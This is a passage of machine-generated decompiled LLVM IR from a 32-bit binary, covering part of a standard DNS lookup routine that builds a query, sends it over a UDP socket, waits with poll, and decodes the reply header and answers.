  %v2_8056721 = sub i32 512, %v1_8056721
  store i32 %v2_8056721, i32* %eax.global-to-local, align 4
  %v0_8056723 = load i32, i32* @edx, align 4
  %v1_8056723 = load i32, i32* @esp, align 4
  %v2_8056723 = add i32 %v1_8056723, 220
  %v3_8056723 = inttoptr i32 %v2_8056723 to i32*
  store i32 %v0_8056723, i32* %v3_8056723, align 4
  %v0_805672a = load i32, i32* @esp, align 4
  %v0_805672d = load i32, i32* %eax.global-to-local, align 4
  %v2_805672d = add i32 %v0_805672a, 8
  %v3_805672d = inttoptr i32 %v2_805672d to i32*
  store i32 %v0_805672d, i32* %v3_805672d, align 4
  %v1_805672e = load i32, i32* @ebx, align 4
  %v2_805672e = add i32 %v1_805672e, %v2_8056516
  %v2_8056732 = add i32 %v0_805672a, 4
  %v3_8056732 = inttoptr i32 %v2_8056732 to i32*
  store i32 %v2_805672e, i32* %v3_8056732, align 4
  %v1_8056733 = add i32 %v0_805672a, 216
  store i32 %v1_8056733, i32* @eax, align 4
  %v3_805673a = inttoptr i32 %v0_805672a to i32*
  store i32 %v1_8056733, i32* %v3_805673a, align 4
  %v0_805673b = call i32 @__encode_question()
  store i32 %v0_805673b, i32* %eax.global-to-local, align 4
  %v0_8056740 = load i32, i32* @esp, align 4
  %v2_8056743 = icmp slt i32 %v0_805673b, 0
  store i32 %v0_805673b, i32* @esi, align 4
  br i1 %v2_8056743, label %dec_label_pc_8056ba9, label %dec_label_pc_805674d

dec_label_pc_805674d:                             ; preds = %dec_label_pc_80566ee
  %v1_805674d = add i32 %v0_8056740, 172
  %v2_805674d = inttoptr i32 %v1_805674d to i16*
  store i16 2, i16* %v2_805674d, align 2
  %v1_8056757 = load i32, i32* @esp, align 4
  %v2_8056757 = add i32 %v1_8056757, -4
  %v3_8056757 = inttoptr i32 %v2_8056757 to i32*
  store i32 %v0_805673b, i32* %v3_8056757, align 4
  %v1_8056758 = add i32 %v1_8056757, 164
  store i32 %v1_8056758, i32* %eax.global-to-local, align 4
  %v2_805675f = add i32 %v1_8056757, -8
  %v3_805675f = inttoptr i32 %v2_805675f to i32*
  store i32 %v1_8056758, i32* %v3_805675f, align 4
  %v1_8056760 = add i32 %v1_8056757, 32
  %v2_8056760 = inttoptr i32 %v1_8056760 to i32*
  %v3_8056760 = load i32, i32* %v2_8056760, align 4
  %v5_8056760 = add i32 %v1_8056757, -12
  %v6_8056760 = inttoptr i32 %v5_8056760 to i32*
  store i32 %v3_8056760, i32* %v6_8056760, align 4
  %v1_8056764 = add i32 %v1_8056757, -16
  %v2_8056764 = inttoptr i32 %v1_8056764 to i32*
  store i32 10, i32* %v2_8056764, align 4
  %v5_8056766 = call i32 @inet_pton(i32 -1, i8* %v4_8056766, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8056766, i32* %eax.global-to-local, align 4
  %v0_805676b = load i32, i32* @esp, align 4
  %v1_805676b = add i32 %v0_805676b, 16
  %tmp47 = icmp slt i32 %v5_8056766, 1
  br i1 %tmp47, label %dec_label_pc_805677c, label %dec_label_pc_8056772

dec_label_pc_8056772:                             ; preds = %dec_label_pc_805674d
  %v1_8056772 = add i32 %v0_805676b, 172
  %v2_8056772 = inttoptr i32 %v1_8056772 to i16*
  store i16 10, i16* %v2_8056772, align 2
  %v0_805677c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805677c

dec_label_pc_805677c:                             ; preds = %dec_label_pc_805674d, %dec_label_pc_8056772
  %v0_8056793 = phi i32 [ %v1_805676b, %dec_label_pc_805674d ], [ %v0_805677c.pre, %dec_label_pc_8056772 ]
  %v1_805677c = add i32 %v0_8056793, 156
  %v2_805677c = inttoptr i32 %v1_805677c to i16*
  %v3_805677c = load i16, i16* %v2_805677c, align 2
  %v12_805677c = icmp eq i16 %v3_805677c, 10
  %v1_8056785 = icmp eq i1 %v12_805677c, false
  %v1_8056793 = add i32 %v0_8056793, 158
  %v2_8056793 = inttoptr i32 %v1_8056793 to i16*
  store i16 13568, i16* %v2_8056793, align 2
  %v0_805679d = load i32, i32* @esp, align 4
  br i1 %v1_8056785, label %dec_label_pc_8056793, label %dec_label_pc_80567b3

dec_label_pc_8056793:                             ; preds = %dec_label_pc_805677c
  %v1_80567a0 = add i32 %v0_805679d, 32
  %v2_80567a0 = inttoptr i32 %v1_80567a0 to i32*
  %v3_80567a0 = load i32, i32* %v2_80567a0, align 4
  %v5_80567a0 = add i32 %v0_805679d, -16
  %v6_80567a0 = inttoptr i32 %v5_80567a0 to i32*
  store i32 %v3_80567a0, i32* %v6_80567a0, align 4
  %v1_80567a4 = call i32 @inet_addr(i32 -1)
  store i32 %v1_80567a4, i32* %eax.global-to-local, align 4
  %v1_80567a9 = load i32, i32* @esp, align 4
  %v2_80567a9 = add i32 %v1_80567a9, 176
  %v3_80567a9 = inttoptr i32 %v2_80567a9 to i32*
  store i32 %v1_80567a4, i32* %v3_80567a9, align 4
  %v0_80567b0 = load i32, i32* @esp, align 4
  %v1_80567b0 = add i32 %v0_80567b0, 16
  br label %dec_label_pc_80567b3

dec_label_pc_80567b3:                             ; preds = %dec_label_pc_805677c, %dec_label_pc_8056793
  %v1_80567b3 = phi i32 [ %v1_80567b0, %dec_label_pc_8056793 ], [ %v0_805679d, %dec_label_pc_805677c ]
  %v0_80567b3 = load i32, i32* @ecx, align 4
  %v2_80567b3 = add i32 %v1_80567b3, -4
  %v3_80567b3 = inttoptr i32 %v2_80567b3 to i32*
  store i32 %v0_80567b3, i32* %v3_80567b3, align 4
  %v1_80567b4 = add i32 %v1_80567b3, -8
  %v2_80567b4 = inttoptr i32 %v1_80567b4 to i32*
  store i32 17, i32* %v2_80567b4, align 4
  %v1_80567b6 = add i32 %v1_80567b3, -12
  %v2_80567b6 = inttoptr i32 %v1_80567b6 to i32*
  store i32 2, i32* %v2_80567b6, align 4
  %v1_80567b8 = add i32 %v1_80567b3, 156
  %v2_80567b8 = inttoptr i32 %v1_80567b8 to i16*
  %v3_80567b8 = load i16, i16* %v2_80567b8, align 2
  %v4_80567b8 = zext i16 %v3_80567b8 to i32
  store i32 %v4_80567b8, i32* %eax.global-to-local, align 4
  %v2_80567c0 = add i32 %v1_80567b3, -16
  %v3_80567c0 = inttoptr i32 %v2_80567c0 to i32*
  store i32 %v4_80567b8, i32* %v3_80567c0, align 4
  %v3_80567c1 = call i32 @socket(i32 -1, i32 %v15_80565a4, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80567c1, i32* %eax.global-to-local, align 4
  %v1_80567c6 = load i32, i32* @esp, align 4
  %v2_80567c6 = add i32 %v1_80567c6, 36
  %v3_80567c6 = inttoptr i32 %v2_80567c6 to i32*
  store i32 %v3_80567c1, i32* %v3_80567c6, align 4
  %v0_80567ca = load i32, i32* @esp, align 4
  %v1_80567ca = add i32 %v0_80567ca, 16
  %v0_80567cd = load i32, i32* %eax.global-to-local, align 4
  %v2_80567cd = icmp slt i32 %v0_80567cd, 0
  br i1 %v2_80567cd, label %dec_label_pc_80567fa, label %dec_label_pc_80567d1

dec_label_pc_80567d1:                             ; preds = %dec_label_pc_80567b3
  %v1_80567d1 = add i32 %v0_80567ca, 172
  store i32 %v1_80567d1, i32* %eax.global-to-local, align 4
  %v0_80567d8 = load i32, i32* @edx, align 4
  %v2_80567d8 = add i32 %v0_80567ca, 12
  %v3_80567d8 = inttoptr i32 %v2_80567d8 to i32*
  store i32 %v0_80567d8, i32* %v3_80567d8, align 4
  %v1_80567d9 = add i32 %v0_80567ca, 8
  %v2_80567d9 = inttoptr i32 %v1_80567d9 to i32*
  store i32 28, i32* %v2_80567d9, align 4
  %v0_80567db = load i32, i32* %eax.global-to-local, align 4
  %v2_80567db = add i32 %v0_80567ca, 4
  %v3_80567db = inttoptr i32 %v2_80567db to i32*
  store i32 %v0_80567db, i32* %v3_80567db, align 4
  %v1_80567dc = add i32 %v0_80567ca, 36
  %v2_80567dc = inttoptr i32 %v1_80567dc to i32*
  %v3_80567dc = load i32, i32* %v2_80567dc, align 4
  %v6_80567dc = inttoptr i32 %v0_80567ca to i32*
  store i32 %v3_80567dc, i32* %v6_80567dc, align 4
  %v3_80567e0 = call i32 @__libc_connect(i32 -1, i32 %v15_80565a4, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80567e0, i32* %eax.global-to-local, align 4
  %v0_80567e5 = load i32, i32* @esp, align 4
  %v2_80567e8 = icmp slt i32 %v3_80567e0, 0
  %v1_80567ea = icmp eq i1 %v2_80567e8, false
  br i1 %v1_80567ea, label %dec_label_pc_8056803, label %dec_label_pc_80567ec

dec_label_pc_80567ec:                             ; preds = %dec_label_pc_80567d1
  %v1_80567ec = call i32 @__errno_location(i32 -1)
  store i32 %v1_80567ec, i32* %eax.global-to-local, align 4
  %v1_80567f1 = inttoptr i32 %v1_80567ec to i32*
  %v2_80567f1 = load i32, i32* %v1_80567f1, align 4
  %v11_80567f1 = icmp eq i32 %v2_80567f1, 101
  %v0_8056b63.pre = load i32, i32* @esp, align 4
  br i1 %v11_80567f1, label %dec_label_pc_8056b63, label %dec_label_pc_80567fa

dec_label_pc_80567fa:                             ; preds = %dec_label_pc_80567ec, %dec_label_pc_80567b3
  %v17_80567fa = phi i32 [ %v1_80567ca, %dec_label_pc_80567b3 ], [ %v0_8056b63.pre, %dec_label_pc_80567ec ]
  %v1_80567fa = add i32 %v17_80567fa, 28
  %v2_80567fa = inttoptr i32 %v1_80567fa to i32*
  %v3_80567fa = load i32, i32* %v2_80567fa, align 4
  %v4_80567fa = add i32 %v3_80567fa, 1
  store i32 %v4_80567fa, i32* %v2_80567fa, align 4
  br label %dec_label_pc_8056b84.backedge

dec_label_pc_8056803:                             ; preds = %dec_label_pc_80567d1
  %v1_8056803 = add i32 %v0_80567e5, 12
  %v2_8056803 = inttoptr i32 %v1_8056803 to i32*
  store i32 0, i32* %v2_8056803, align 4
  %v0_8056805 = load i32, i32* @ebx, align 4
  %v1_8056805 = load i32, i32* @esi, align 4
  %v2_8056805 = add i32 %v1_8056805, %v0_8056805
  store i32 %v2_8056805, i32* %eax.global-to-local, align 4
  %v2_8056808 = add i32 %v0_80567e5, 8
  %v3_8056808 = inttoptr i32 %v2_8056808 to i32*
  store i32 %v2_8056805, i32* %v3_8056808, align 4
  %v2_8056809 = add i32 %v0_80567e5, 4
  %v3_8056809 = inttoptr i32 %v2_8056809 to i32*
  store i32 %v2_8056516, i32* %v3_8056809, align 4
  %v1_805680a = add i32 %v0_80567e5, 36
  %v2_805680a = inttoptr i32 %v1_805680a to i32*
  %v3_805680a = load i32, i32* %v2_805680a, align 4
  %v6_805680a = inttoptr i32 %v0_80567e5 to i32*
  store i32 %v3_805680a, i32* %v6_805680a, align 4
  %v4_805680e = call i32 @__libc_send(i32 -1, i32 %v15_80565a4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805680e, i32* %eax.global-to-local, align 4
  %v0_8056813 = load i32, i32* @esp, align 4
  %v1_8056813 = add i32 %v0_8056813, 36
  %v2_8056813 = inttoptr i32 %v1_8056813 to i32*
  %v3_8056813 = load i32, i32* %v2_8056813, align 4
  store i32 %v3_8056813, i32* %eax.global-to-local, align 4
  %v1_8056817 = add i32 %v0_8056813, 232
  %v2_8056817 = inttoptr i32 %v1_8056817 to i16*
  store i16 1, i16* %v2_8056817, align 2
  %v0_8056821 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056821 = load i32, i32* @esp, align 4
  %v2_8056821 = add i32 %v1_8056821, 228
  %v3_8056821 = inttoptr i32 %v2_8056821 to i32*
  store i32 %v0_8056821, i32* %v3_8056821, align 4
  %v0_8056828 = load i32, i32* @esp, align 4
  %v1_805682b = add i32 %v0_8056828, 8
  %v2_805682b = inttoptr i32 %v1_805682b to i32*
  store i32 10000, i32* %v2_805682b, align 4
  %v1_8056830 = add i32 %v0_8056828, 4
  %v2_8056830 = inttoptr i32 %v1_8056830 to i32*
  store i32 1, i32* %v2_8056830, align 4
  %v1_8056832 = add i32 %v0_8056828, 228
  store i32 %v1_8056832, i32* %eax.global-to-local, align 4
  %v3_8056839 = inttoptr i32 %v0_8056828 to i32*
  store i32 %v1_8056832, i32* %v3_8056839, align 4
  %v0_805683a = call i32 @__libc_poll()
  store i32 %v0_805683a, i32* %eax.global-to-local, align 4
  %v0_805683f = load i32, i32* @esp, align 4
  %v1_805683f = add i32 %v0_805683f, 16
  %tmp48 = icmp slt i32 %v0_805683a, 1
  br i1 %tmp48, label %dec_label_pc_8056b63, label %dec_label_pc_805684a

dec_label_pc_805684a:                             ; preds = %dec_label_pc_8056803
  %v1_805684a = add i32 %v0_805683f, 12
  %v2_805684a = inttoptr i32 %v1_805684a to i32*
  store i32 0, i32* %v2_805684a, align 4
  %v1_805684c = add i32 %v0_805683f, 8
  %v2_805684c = inttoptr i32 %v1_805684c to i32*
  store i32 512, i32* %v2_805684c, align 4
  %v2_8056851 = add i32 %v0_805683f, 4
  %v3_8056851 = inttoptr i32 %v2_8056851 to i32*
  store i32 %v2_8056516, i32* %v3_8056851, align 4
  %v1_8056852 = add i32 %v0_805683f, 36
  %v2_8056852 = inttoptr i32 %v1_8056852 to i32*
  %v3_8056852 = load i32, i32* %v2_8056852, align 4
  %v6_8056852 = inttoptr i32 %v0_805683f to i32*
  store i32 %v3_8056852, i32* %v6_8056852, align 4
  %v4_8056856 = call i32 @__libc_recv(i32 -1, i32 %v15_80565a4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8056856, i32* @eax, align 4
  %v1_805685b = load i32, i32* @esp, align 4
  %v2_805685b = add i32 %v1_805685b, 32
  %v3_805685b = inttoptr i32 %v2_805685b to i32*
  store i32 %v4_8056856, i32* %v3_805685b, align 4
  %v0_805685f = load i32, i32* @esp, align 4
  %v1_805685f = add i32 %v0_805685f, 16
  %v7_8056865 = icmp sgt i32 %v4_8056856, 11
  br i1 %v7_8056865, label %dec_label_pc_805686b, label %dec_label_pc_8056b18

dec_label_pc_805686b:                             ; preds = %dec_label_pc_805684a
  %v0_805686b = load i32, i32* @ebx, align 4
  %v2_805686b = add i32 %v0_805685f, 12
  %v3_805686b = inttoptr i32 %v2_805686b to i32*
  store i32 %v0_805686b, i32* %v3_805686b, align 4
  %v0_805686c = load i32, i32* @ebx, align 4
  %v2_805686c = add i32 %v0_805685f, 8
  %v3_805686c = inttoptr i32 %v2_805686c to i32*
  store i32 %v0_805686c, i32* %v3_805686c, align 4
  %v1_805686d = add i32 %v0_805685f, 84
  store i32 %v1_805686d, i32* %eax.global-to-local, align 4
  %v2_8056871 = add i32 %v0_805685f, 4
  %v3_8056871 = inttoptr i32 %v2_8056871 to i32*
  store i32 %v1_805686d, i32* %v3_8056871, align 4
  %v3_8056872 = inttoptr i32 %v0_805685f to i32*
  store i32 %v2_8056516, i32* %v3_8056872, align 4
  %v0_8056873 = call i32 @__decode_header()
  store i32 %v0_8056873, i32* %eax.global-to-local, align 4
  %v0_8056878 = load i32, i32* @esp, align 4
  %v1_8056878 = add i32 %v0_8056878, 84
  %v2_8056878 = inttoptr i32 %v1_8056878 to i32*
  %v3_8056878 = load i32, i32* %v2_8056878, align 4
  store i32 %v3_8056878, i32* %edx.global-to-local, align 4
  %v2_805687c = add i32 %v0_8056878, 60
  %v3_805687c = inttoptr i32 %v2_805687c to i32*
  store i32 %v3_8056878, i32* %v3_805687c, align 4
  %v0_8056880 = load i32, i32* @esp, align 4
  %v1_8056880 = add i32 %v0_8056880, 16
  %v1_8056883 = add i32 %v0_8056880, 72
  %v2_8056883 = inttoptr i32 %v1_8056883 to i32*
  %v3_8056883 = load i32, i32* %v2_8056883, align 4
  store i32 %v3_8056883, i32* @eax, align 4
  %v0_8056887 = load i32, i32* %edx.global-to-local, align 4
  %v12_8056887 = icmp eq i32 %v0_8056887, %v3_8056883
  %v1_8056889 = icmp eq i1 %v12_8056887, false
  br i1 %v1_8056889, label %dec_label_pc_8056b18, label %dec_label_pc_805688f

dec_label_pc_805688f:                             ; preds = %dec_label_pc_805686b
  %v1_805688f = add i32 %v0_8056880, 88
  %v2_805688f = inttoptr i32 %v1_805688f to i32*
  %v3_805688f = load i32, i32* %v2_805688f, align 4
  %v4_805688f = icmp eq i32 %v3_805688f, 0
  br i1 %v4_805688f, label %dec_label_pc_8056b18, label %dec_label_pc_805689a

dec_label_pc_805689a:                             ; preds = %dec_label_pc_805688f
  %v1_805689a = add i32 %v0_8056880, 112
  %v2_805689a = inttoptr i32 %v1_805689a to i32*
  %v3_805689a = load i32, i32* %v2_805689a, align 4
  store i32 %v3_805689a, i32* @eax, align 4
  %v9_805689e = icmp eq i32 %v3_805689a, 3
  %v1_80568a1 = icmp eq i1 %v9_805689e, false
  br i1 %v1_80568a1, label %dec_label_pc_8056909, label %dec_label_pc_80568a3

dec_label_pc_80568a3:                             ; preds = %dec_label_pc_805689a
  %v1_80568a3 = add i32 %v0_8056880, 67
  %v2_80568a3 = inttoptr i32 %v1_80568a3 to i8*
  %v3_80568a3 = load i8, i8* %v2_80568a3, align 1
  %v4_80568a3 = icmp eq i8 %v3_80568a3, 0
  %v1_80568a8 = icmp eq i1 %v4_80568a3, false
  br i1 %v1_80568a8, label %dec_label_pc_80568f9, label %dec_label_pc_80568aa

dec_label_pc_80568aa:                             ; preds = %dec_label_pc_80568a3
  %v0_80568aa = load i32, i32* @ecx, align 4
  %v2_80568aa = add i32 %v0_8056880, 12
  %v3_80568aa = inttoptr i32 %v2_80568aa to i32*
  store i32 %v0_80568aa, i32* %v3_80568aa, align 4
  %v1_80568ab = add i32 %v0_8056880, 8
  %v2_80568ab = inttoptr i32 %v1_80568ab to i32*
  store i32 ptrtoint (i32* @global_var_805c4e8.497 to i32), i32* %v2_80568ab, align 4
  %v1_80568b0 = add i32 %v0_8056880, 4
  %v2_80568b0 = inttoptr i32 %v1_80568b0 to i32*
  store i32 134566343, i32* %v2_80568b0, align 4
  %v1_80568b5 = add i32 %v0_8056880, 200
  store i32 %v1_80568b5, i32* @esi, align 4
  %v3_80568bc = inttoptr i32 %v0_8056880 to i32*
  store i32 %v1_80568b5, i32* %v3_80568bc, align 4
  %v2_80568bd = call i32 @__pthread_return_void(i32 -1, i32 %v15_80565a4)
  store i32 %v2_80568bd, i32* %eax.global-to-local, align 4
  %v0_80568c2 = load i32, i32* @esp, align 4
  %v1_80568c2 = inttoptr i32 %v0_80568c2 to i32*
  store i32 ptrtoint (i32* @global_var_805c4e8.497 to i32), i32* %v1_80568c2, align 4
  %v1_80568c9 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_80568c9, i32* %eax.global-to-local, align 4
  %v0_80568ce = load i32, i32* @global_var_8062bd8.561, align 8
  store i32 %v0_80568ce, i32* %ebx.global-to-local, align 4
  %v0_80568d4 = load i32, i32* @esp, align 4
  %v1_80568d4 = inttoptr i32 %v0_80568d4 to i32*
  %v2_80568d4 = load i32, i32* %v1_80568d4, align 4
  store i32 %v2_80568d4, i32* @eax, align 4
  %v3_80568d4 = add i32 %v0_80568d4, 4
  %v1_80568d5 = inttoptr i32 %v3_80568d4 to i32*
  %v2_80568d5 = load i32, i32* %v1_80568d5, align 4
  store i32 %v2_80568d5, i32* %edx.global-to-local, align 4
  %v1_80568d6 = add i32 %v0_80568ce, -1
  store i32 %v1_80568d6, i32* @ebx, align 4
  store i32 1, i32* %v1_80568d5, align 4
  %v0_80568d9 = load i32, i32* @esi, align 4
  store i32 %v0_80568d9, i32* %v1_80568d4, align 4
  %v2_80568da = call i32 @__pthread_return_void(i32 -1, i32 %v15_80565a4)
  store i32 %v2_80568da, i32* %eax.global-to-local, align 4
  %v0_80568df = load i32, i32* @esp, align 4
  %v1_80568e2 = add i32 %v0_80568df, 52
  %v2_80568e2 = inttoptr i32 %v1_80568e2 to i32*
  %v3_80568e2 = load i32, i32* %v2_80568e2, align 4
  %v4_80568e2 = load i32, i32* @ebx, align 4
  %v5_80568e2 = sub i32 %v3_80568e2, %v4_80568e2
  %v11_80568e2 = xor i32 %v4_80568e2, %v3_80568e2
  %v12_80568e2 = xor i32 %v5_80568e2, %v3_80568e2
  %v13_80568e2 = and i32 %v12_80568e2, %v11_80568e2
  %v14_80568e2 = icmp slt i32 %v13_80568e2, 0
  %v16_80568e2 = icmp slt i32 %v5_80568e2, 0
  %v2_80568e6 = icmp eq i1 %v16_80568e2, %v14_80568e2
  br i1 %v2_80568e6, label %dec_label_pc_80568f9, label %dec_label_pc_80568e8

dec_label_pc_80568e8:                             ; preds = %dec_label_pc_80568aa
  %v1_80568e8 = add i32 %v0_80568df, 60
  %v2_80568e8 = inttoptr i32 %v1_80568e8 to i32*
  %v3_80568e8 = load i32, i32* %v2_80568e8, align 4
  store i32 %v3_80568e8, i32* %edx.global-to-local, align 4
  %v3_80568ec = load i32, i32* %v2_80568e2, align 4
  %v4_80568ec = add i32 %v3_80568ec, 1
  store i32 %v4_80568ec, i32* %v2_80568e2, align 4
  %v0_80568f0 = load i32, i32* %edx.global-to-local, align 4
  %v1_80568f0 = load i32, i32* @esp, align 4
  %v2_80568f0 = add i32 %v1_80568f0, 56
  %v3_80568f0 = inttoptr i32 %v2_80568f0 to i32*
  store i32 %v0_80568f0, i32* %v3_80568f0, align 4
  br label %dec_label_pc_8056b84.backedge

dec_label_pc_80568f9:                             ; preds = %dec_label_pc_80568aa, %dec_label_pc_80568a3
  %v0_80568f9 = call i32 @__GI___h_errno_location()
  store i32 %v0_80568f9, i32* %eax.global-to-local, align 4
  %v1_80568fe = inttoptr i32 %v0_80568f9 to i32*
  store i32 1, i32* %v1_80568fe, align 4
  br label %dec_label_pc_8056bbc

dec_label_pc_8056909:                             ; preds = %dec_label_pc_805689a
  %v1_8056909 = icmp eq i32 %v3_805689a, 0
  %v1_805690b = icmp eq i1 %v1_8056909, false
  br i1 %v1_805690b, label %dec_label_pc_8056b18, label %dec_label_pc_8056911

dec_label_pc_8056911:                             ; preds = %dec_label_pc_8056909
  %v1_8056911 = add i32 %v0_8056880, 120
  %v2_8056911 = inttoptr i32 %v1_8056911 to i32*
  %v3_8056911 = load i32, i32* %v2_8056911, align 4
  %tmp49 = icmp slt i32 %v3_8056911, 1
  br i1 %tmp49, label %dec_label_pc_8056921, label %dec_label_pc_8056918

dec_label_pc_8056918:                             ; preds = %dec_label_pc_8056911
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8056940

dec_label_pc_8056921:                             ; preds = %dec_label_pc_8056911
  %v0_8056921 = call i32 @__GI___h_errno_location()
  store i32 %v0_8056921, i32* %eax.global-to-local, align 4
  %v1_8056926 = inttoptr i32 %v0_8056921 to i32*
  store i32 4, i32* %v1_8056926, align 4
  br label %dec_label_pc_8056bbc

dec_label_pc_8056931:                             ; preds = %dec_label_pc_8056940
  %v2_8056931 = add i32 %v0_8056948, -4
  %v3_8056931 = inttoptr i32 %v2_8056931 to i32*
  store i32 %v0_8056931, i32* %v3_8056931, align 4
  %v0_8056932 = load i32, i32* @ebx, align 4
  %v1_8056932 = add i32 %v0_8056932, 1
  store i32 %v1_8056932, i32* @ebx, align 4
  %v0_8056933 = load i32, i32* @eax, align 4
  %v2_8056933 = add i32 %v0_8056948, -8
  %v3_8056933 = inttoptr i32 %v2_8056933 to i32*
  store i32 %v0_8056933, i32* %v3_8056933, align 4
  %v0_8056934 = load i32, i32* @esi, align 4
  %v2_8056934 = add i32 %v0_8056948, -12
  %v3_8056934 = inttoptr i32 %v2_8056934 to i32*
  store i32 %v0_8056934, i32* %v3_8056934, align 4
  %v2_8056935 = add i32 %v0_8056948, -16
  %v3_8056935 = inttoptr i32 %v2_8056935 to i32*
  store i32 %v2_8056516, i32* %v3_8056935, align 4
  %v0_8056936 = call i32 @__length_question()
  store i32 %v0_8056936, i32* @eax, align 4
  %v0_805693b = load i32, i32* @esp, align 4
  %v1_805693b = add i32 %v0_805693b, 16
  %v0_805693e = load i32, i32* @esi, align 4
  %v2_805693e = add i32 %v0_805693e, %v0_8056936
  %v0_8056940.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8056940

dec_label_pc_8056940:                             ; preds = %dec_label_pc_8056918, %dec_label_pc_8056931
  %v0_8056931 = phi i32 [ %v3_805689a, %dec_label_pc_8056918 ], [ %v0_8056936, %dec_label_pc_8056931 ]
  %v0_8056948 = phi i32 [ %v1_8056880, %dec_label_pc_8056918 ], [ %v1_805693b, %dec_label_pc_8056931 ]
  %v0_8056940 = phi i32 [ 0, %dec_label_pc_8056918 ], [ %v0_8056940.pre, %dec_label_pc_8056931 ]
  %storemerge = phi i32 [ 12, %dec_label_pc_8056918 ], [ %v2_805693e, %dec_label_pc_8056931 ]
  store i32 %storemerge, i32* @esi, align 4
  %v2_8056940 = add i32 %v0_8056948, 100
  %v3_8056940 = inttoptr i32 %v2_8056940 to i32*
  %v4_8056940 = load i32, i32* %v3_8056940, align 4
  %v5_8056940 = sub i32 %v0_8056940, %v4_8056940
  %v11_8056940 = xor i32 %v4_8056940, %v0_8056940
  %v12_8056940 = xor i32 %v5_8056940, %v0_8056940
  %v13_8056940 = and i32 %v12_8056940, %v11_8056940
  %v14_8056940 = icmp slt i32 %v13_8056940, 0
  %v16_8056940 = icmp slt i32 %v5_8056940, 0
  %v2_8056944 = icmp eq i1 %v16_8056940, %v14_8056940
  br i1 %v2_8056944, label %dec_label_pc_8056946, label %dec_label_pc_8056931

dec_label_pc_8056946:                             ; preds = %dec_label_pc_8056940
  store i32 0, i32* @ebx, align 4
  %v1_8056948 = add i32 %v0_8056948, 27
  %v2_8056948 = inttoptr i32 %v1_8056948 to i8*
  store i8 1, i8* %v2_8056948, align 1
  %v0_8056a76.pre = load i32, i32* @ebx, align 4
  %v1_8056a76.pre = load i32, i32* @esp, align 4
  %v2_8056a7655 = add i32 %v1_8056a76.pre, 104
  %v3_8056a7656 = inttoptr i32 %v2_8056a7655 to i32*
  %v4_8056a7657 = load i32, i32* %v3_8056a7656, align 4
  %v5_8056a7658 = sub i32 %v0_8056a76.pre, %v4_8056a7657
  %v11_8056a7660 = xor i32 %v4_8056a7657, %v0_8056a76.pre
  %v12_8056a7661 = xor i32 %v5_8056a7658, %v0_8056a76.pre
  %v13_8056a7662 = and i32 %v12_8056a7661, %v11_8056a7660
  %v14_8056a7663 = icmp slt i32 %v13_8056a7662, 0
  %v16_8056a7665 = icmp slt i32 %v5_8056a7658, 0
  %v2_8056a7a66 = icmp eq i1 %v16_8056a7665, %v14_8056a7663
  br i1 %v2_8056a7a66, label %dec_label_pc_8056a86, label %dec_label_pc_8056a7c.lr.ph

dec_label_pc_8056a7c.lr.ph:                       ; preds = %dec_label_pc_8056946
  %v0_8056a7c.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056a7c

dec_label_pc_8056952:                             ; preds = %dec_label_pc_8056a7c
  %v1_8056952 = add i32 %v0_805695267, 116
  store i32 %v1_8056952, i32* %eax.global-to-local, align 4
  %v2_8056956 = add i32 %v0_805695267, -4
  %v3_8056956 = inttoptr i32 %v2_8056956 to i32*
  store i32 %v1_8056952, i32* %v3_8056956, align 4
  %v3_8056957 = load i32, i32* %v3_8056a7c, align 4
  %v5_8056957 = add i32 %v0_805695267, -8
  %v6_8056957 = inttoptr i32 %v5_8056957 to i32*
  store i32 %v3_8056957, i32* %v6_8056957, align 4
  %v0_805695b = load i32, i32* @esi, align 4
  %v2_805695b = add i32 %v0_805695267, -12
  %v3_805695b = inttoptr i32 %v2_805695b to i32*
  store i32 %v0_805695b, i32* %v3_805695b, align 4
  %v2_805695c = add i32 %v0_805695267, -16
  %v3_805695c = inttoptr i32 %v2_805695c to i32*
  store i32 %v2_8056516, i32* %v3_805695c, align 4
  %v0_805695d = call i32 @__decode_answer()
  store i32 %v0_805695d, i32* @eax, align 4
  %v1_8056962 = load i32, i32* @esp, align 4
  %v2_8056962 = add i32 %v1_8056962, 68
  %v3_8056962 = inttoptr i32 %v2_8056962 to i32*
  store i32 %v0_805695d, i32* %v3_8056962, align 4
  %v0_8056966 = load i32, i32* @esp, align 4
  %v1_8056966 = add i32 %v0_8056966, 16
  %v2_8056969 = icmp slt i32 %v0_805695d, 0
  %v1_805696b = icmp eq i1 %v2_8056969, false
  br i1 %v1_805696b, label %dec_label_pc_8056985, label %dec_label_pc_805696d

dec_label_pc_805696d:                             ; preds = %dec_label_pc_8056952
  %v0_805696d = load i32, i32* @ebx, align 4
  %v1_805696d = icmp eq i32 %v0_805696d, 0
  br i1 %v1_805696d, label %dec_label_pc_8056b18, label %dec_label_pc_8056975

dec_label_pc_8056975:                             ; preds = %dec_label_pc_805696d
  %v1_8056975 = add i32 %v0_8056966, 100
  %v2_8056975 = inttoptr i32 %v1_8056975 to i32*
  %v3_8056975 = load i32, i32* %v2_8056975, align 4
  %v4_8056975 = icmp eq i32 %v3_8056975, 0
  br i1 %v4_8056975, label %dec_label_pc_8056b18, label %dec_label_pc_8056a86

dec_label_pc_8056985:                             ; preds = %dec_label_pc_8056952
  %v1_8056985 = add i32 %v0_8056966, 43
  %v2_8056985 = inttoptr i32 %v1_8056985 to i8*
  %v3_8056985 = load i8, i8* %v2_8056985, align 1
  %v4_8056985 = icmp eq i8 %v3_8056985, 0
  br i1 %v4_8056985, label %dec_label_pc_8056a26, label %dec_label_pc_8056990

dec_label_pc_8056990:                             ; preds = %dec_label_pc_8056985
  %v0_8056990 = load i32, i32* @edi, align 4
  %v1_8056990 = add i32 %v0_8056990, 28
  %v2_8056990 = inttoptr i32 %v1_8056990 to i32*
  %v3_8056990 = load i32, i32* %v2_8056990, align 4
  store i32 %v3_8056990, i32* %eax.global-to-local, align 4
  %v2_8056993 = add i32 %v0_8056966, 160
